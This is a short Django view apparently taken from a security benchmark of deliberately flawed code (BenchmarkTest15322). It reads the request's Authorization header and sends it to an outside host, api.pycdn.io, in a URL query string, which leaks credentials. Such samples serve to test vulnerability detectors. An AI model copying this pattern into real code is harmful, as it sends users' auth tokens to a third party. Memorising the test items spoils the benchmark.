# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import urllib.request
import urllib.parse
import ssl
from types import SimpleNamespace


def BenchmarkTest15322(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    ns = SimpleNamespace(payload=auth_header)
    data = getattr(ns, 'payload')
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return JsonResponse({"saved": True})
